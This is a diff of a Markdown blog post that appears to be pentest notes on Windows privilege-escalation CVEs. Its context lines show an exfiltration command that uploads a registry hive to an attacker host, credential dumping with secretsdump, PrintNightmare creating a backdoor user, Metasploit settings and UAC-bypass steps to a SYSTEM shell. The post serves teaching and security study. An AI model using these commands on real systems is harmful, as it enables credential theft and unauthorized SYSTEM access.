@@ -1,34 +1,44 @@
 ---
 title: Windows Privilege Escalation CVEs
 date: 2026-06-26 17:19:44
+
 categories:
   - Active Directory
   - Windows
   - Post-Exploitation
   - Windows Privesc
   - Old Systems
+
 tags:
-  - Privilege-Escalation
   - Windows
-  - PrintNightmare
-  - CVE-2021-1675
-  - CVE-2021-34527
-  - Print-Spooler
+  - Privilege-Escalation
   - CVE
-  - Metasploit
   - HiveNightmare
-  - UAC-Bypass
   - SeriousSam
+  - PrintNightmare
   - CVE-2021-36934
+  - CVE-2021-34527
+  - CVE-2021-1675
   - CVE-2020-0668
   - CVE-2019-1388
   - EternalBlue
   - MS17-010
   - SMBv1
+  - Print-Spooler
+  - UAC-Bypass
   - Registry-Hives
+  - Metasploit
   - Meterpreter
   - Windows-Exploitation
+
+cover: /img/windows-privesc-cves.png
+top_img: /img/bg-img.jpg
+description: Exploit common Windows privilege escalation vulnerabilities including HiveNightmare, PrintNightmare, CVE-2020-0668, CVE-2019-1388, and EternalBlue to obtain SYSTEM privileges.
 ---
+
+
+
+
 
 ## CVE-2021-36934 HiveNightmare / SeriousSam
 
@@ -66,6 +76,8 @@ curl.exe -F "files=@SECURITY" http://<attacker-ip>:8000/upload
 impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
 ```
 
+
+
 ## CVE-2021-34527 / CVE-2021-1675 PrintNightmare
 
 > PrintNightmare allows authenticated users to execute code as SYSTEM through the Print Spooler service.
@@ -93,6 +105,8 @@ Invoke-Nightmare -NewUser "twistzz" -NewPassword "P@ssw0rd!" -DriverName "PrintI
 ```cmd
 net user twistzz
 ```
+
+
 
 ## CVE-2020-0668 Service Tracing File Move
 
@@ -152,29 +166,38 @@ set LPORT 8443
 exploit
 ```
 
+
 ## CVE-2019-1388 UAC Certificate Dialog
 
+
+  
 > ➜ CVE-2019-1388 is a UAC bypass where a specially signed Microsoft binary (e.g., `hhupd.exe`) allows viewing certificate information; this makes the `Issued by` field clickable in the certificate dialog, and clicking it opens a browser as `NT AUTHORITY\SYSTEM`, allowing us to escape and spawn a SYSTEM shell.
 
-> First right click on the vulnerable binary `hhupd.exe` and select `Run as administrator` from the menu
+  
+> First right click on the vulnerable binary `hhupd.exe` and select `Run as administrator` from the menu 
 
 ![NTLM Relay SMB to SMB](/img/1.png)
 
-> Next, click on `Show information about the publisher's certificate` to open the certificate dialog.
+> Next, click on `Show information about the publisher's certificate` to open the certificate dialog.
+
 
 ![NTLM Relay SMB to SMB](/img/2.png)
 
-> Next, we go back to the General tab and see that the `Issued by` field is populated with a hyperlink.
+> Next, we go back to the General tab and see that the `Issued by` field is populated with a hyperlink.
+
 
 ![NTLM Relay SMB to SMB](/img/3.png)
 
-> Next, we can right-click anywhere on the web page and choose `View page source`. Once the page source opens in another tab, right-click again and select `Save as`, and a `Save As` dialog box will open.
+> Next, we can right-click anywhere on the web page and choose `View page source`. Once the page source opens in another tab, right-click again and select `Save as`, and a `Save As` dialog box will open.
 
 ![NTLM Relay SMB to SMB](/img/4.png)
 
-> At this point, we can launch any program we would like as SYSTEM. Type `c:\windows\system32\cmd.exe` in the file path and hit enter. If all goes to plan, we will have a cmd.exe instance running as SYSTEM.
+
+> At this point, we can launch any program we would like as SYSTEM. Type `c:\windows\system32\cmd.exe` in the file path and hit enter. If all goes to plan, we will have a cmd.exe instance running as SYSTEM.
 
 ![NTLM Relay SMB to SMB](/img/5.png)
+
+
 
 ## MS17-010 EternalBlue
 
